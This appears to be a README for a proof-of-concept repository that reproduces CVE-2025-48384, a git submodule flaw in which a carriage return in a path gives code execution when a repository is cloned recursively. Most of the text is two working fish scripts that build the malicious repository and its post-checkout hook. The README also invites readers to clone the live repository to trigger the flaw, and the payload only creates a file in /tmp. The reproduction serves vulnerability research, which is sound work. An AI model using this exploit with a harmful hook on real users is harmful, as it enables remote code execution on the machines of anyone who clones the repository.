# CVE-2025-48384: Breaking git with a carriage return and cloning RCE

Reproduction from <https://dgl.cx/2025/07/git-clone-submodule-cve-2025-48384>. All credits to David Leadbeater.

This is a basic reproduction attempt of the vulnerability.

To trigger, do `git clone --recursive https://github.com/acheong08/CVE-2025-48384` on a vulnerable git version and you'll find a `/tmp/fishsucks` file suddenly appearing.

I was able to reproduce on git version 2.50.0.

Below is the script used to test locally.

```fish
#!/usr/bin/fish
git init sub
echo '#!/usr/bin/env bash
touch /tmp/fishsucks
' > sub/post-checkout
chmod +x sub/post-checkout
git -C sub add post-checkout
git -C sub commit -m hook

git init repo
git -C repo -c protocol.file.allow=always submodule add "$PWD/sub" sub
git -C repo mv sub (printf "sub\r")

git config unset -f repo/.gitmodules submodule.sub.path
printf "\tpath = \"sub\r\"\n" >> repo/.gitmodules

git config unset -f repo/.git/modules/sub/config core.worktree
printf "[core]\n\tworktree = \"../../../sub\r\"\n" >> repo/.git/modules/sub/config

ln -s .git/modules/sub/hooks repo/sub
git -C repo add -A
git -C repo commit -m submodule

git -c protocol.file.allow=always clone --recurse-submodules repo bad-clone
not test -f "/tmp/fishsucks"
rm -rf ./repo ./sub ./bad-clone
```

Modified script for pushing to Github:

```fish
#!/usr/bin/fish
if not test -d sub
    git clone https://github.com/acheong08/totallynotsuspicious.git sub
else
    git -C sub pull
end

echo '#!/usr/bin/env bash
touch /tmp/fishsucks
' > sub/post-checkout
chmod +x sub/post-checkout
git -C sub add post-checkout
git -C sub commit -m hook; or true
git -C sub push origin HEAD

rm -rf repo
git init repo
git -C repo -c protocol.file.allow=always submodule add https://github.com/acheong08/totallynotsuspicious.git sub
git -C repo mv sub (printf "sub\r")

git config unset -f repo/.gitmodules submodule.sub.path
printf "\tpath = \"sub\r\"\n" >> repo/.gitmodules

git config unset -f repo/.git/modules/sub/config core.worktree
printf "[core]\n\tworktree = \"../../../sub\r\"\n" >> repo/.git/modules/sub/config

ln -s .git/modules/sub/hooks repo/sub
git -C repo add -A
git -C repo commit -m submodule

git -c protocol.file.allow=always clone --recurse-submodules repo bad-clone
not test -f "/tmp/fishsucks"
```
